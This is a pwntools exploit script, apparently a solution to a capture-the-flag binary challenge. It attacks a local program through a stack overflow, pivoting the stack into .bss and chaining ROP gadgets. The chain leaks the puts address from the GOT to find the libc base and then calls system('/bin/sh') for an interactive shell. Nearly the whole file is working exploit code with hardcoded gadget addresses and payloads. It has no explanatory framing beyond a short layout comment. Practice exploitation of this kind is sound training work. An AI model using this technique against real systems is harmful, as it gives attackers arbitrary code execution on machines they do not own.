from pwn import * 

binary = "./program_patched"
p = process(binary)
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
context.log_level = 'debug'

s = '''
b * leave_messages_with_great_care
b * leave_messages_with_great_care+80
b * my_read
'''
gdb.attach(p, s)

# your exploit continues here
p.recvuntil(b"Write some words on the top right corner of the wall:\n")

# 0x30 payload
buf1 = elf.bss() + 0x500 
buf2 = elf.bss() + 0x600
pop_rdi = 0x0000000000400a33
pop_rsi = 0x0000000000400a31
leave_ret = 0x0000000000400868
ret = 0x0000000000400576

payload = flat(
    b'C' * 0x10,
    0xdeadbeef,
    0x00000000004008bc, # main
    elf.sym['my_read'],
    leave_ret
)
p.send(payload)

p.recvuntil(b"Write some words right in the center of the wall with GREAT care:\n")
payload2 = flat(
    b'A' * 0x30,
    buf1,
    pop_rdi,
    buf1,
    pop_rsi,
    0x100,
    0
)
p.send(payload2)


payload3 = flat(
    buf2, # "restore" the another fake rbp to transverse to other place
    pop_rdi, # work start
    elf.got['puts'],
    elf.plt['puts'],
    pop_rdi,
    buf2,
    pop_rsi,
    0x100,
    0,
    elf.sym['my_read'],
    leave_ret
)
p.send(payload3) # sending to first self-called my_read

leak = int.from_bytes(p.recvuntil('\x7f'), 'little')
print(hex(leak))
libc_base = leak - libc.sym['puts']
print(hex(libc_base))
sys_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + 0x1b3d88

payload4 = flat(
    b'D' * 8, # complete fake rbp
    ret,
    pop_rdi,
    bin_sh_addr,
    sys_addr
)
p.send(payload4) # sending to second self-called my_read


p.interactive()

#payload 
'''
buf1 (saved rbp)

pop rdi 8
buf1 8
pop rsi 8 
size 8
(dummy) 8

pop rdi 8
elf.got['puts'] 8
elf.plt['puts'] 8


'''